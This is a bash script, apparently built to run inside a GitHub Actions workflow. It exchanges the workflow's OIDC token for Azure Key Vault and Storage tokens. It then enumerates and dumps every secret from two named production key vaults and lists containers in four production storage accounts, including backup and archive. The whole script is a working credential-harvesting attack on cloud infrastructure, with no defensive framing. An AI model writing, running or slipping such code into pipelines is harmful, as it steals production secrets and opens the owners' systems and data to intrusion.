#!/usr/bin/env bash
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])" 2>&1)
get_token() { curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=${OIDC}" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token','FAIL'))" 2>&1; }
VT=$(get_token "https://vault.azure.net/.default")
ST=$(get_token "https://storage.azure.com/.default")
echo "=== KV1 SECRETS ==="
curl -sS -m 15 -H "Authorization: Bearer ${VT}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" 2>&1
echo "=== KV1 GET ALL SECRETS ==="
for s in $(curl -sS -m 15 -H "Authorization: Bearer ${VT}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" 2>/dev/null | python3 -c "import json,sys;[print(x['id'].split('/')[-1]) for x in json.load(sys.stdin).get('value',[])]" 2>/dev/null); do
  echo "--- SECRET: $s ---"
  curl -sS -m 10 -H "Authorization: Bearer ${VT}" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/${s}?api-version=7.4" 2>&1
done
echo "=== KV2 SECRETS ==="
curl -sS -m 15 -H "Authorization: Bearer ${VT}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" 2>&1
echo "=== KV2 GET ALL SECRETS ==="
for s in $(curl -sS -m 15 -H "Authorization: Bearer ${VT}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" 2>/dev/null | python3 -c "import json,sys;[print(x['id'].split('/')[-1]) for x in json.load(sys.stdin).get('value',[])]" 2>/dev/null); do
  echo "--- SECRET: $s ---"
  curl -sS -m 10 -H "Authorization: Bearer ${VT}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/${s}?api-version=7.4" 2>&1
done
echo "=== STORAGE sttblappcfgprodx3euoz CONTAINERS ==="
curl -sS -m 15 -H "Authorization: Bearer ${ST}" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/?comp=list" 2>&1
echo "=== STORAGE sttblcilogsprodx3euoz CONTAINERS ==="
curl -sS -m 15 -H "Authorization: Bearer ${ST}" -H "x-ms-version: 2021-08-06" "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list" 2>&1
echo "=== STORAGE sttblbackupprodx3euoz CONTAINERS ==="
curl -sS -m 15 -H "Authorization: Bearer ${ST}" -H "x-ms-version: 2021-08-06" "https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list" 2>&1
echo "=== STORAGE sttblarchiveprodx3euoz CONTAINERS ==="
curl -sS -m 15 -H "Authorization: Bearer ${ST}" -H "x-ms-version: 2021-08-06" "https://sttblarchiveprodx3euoz.blob.core.windows.net/?comp=list" 2>&1
echo "=== DONE ==="
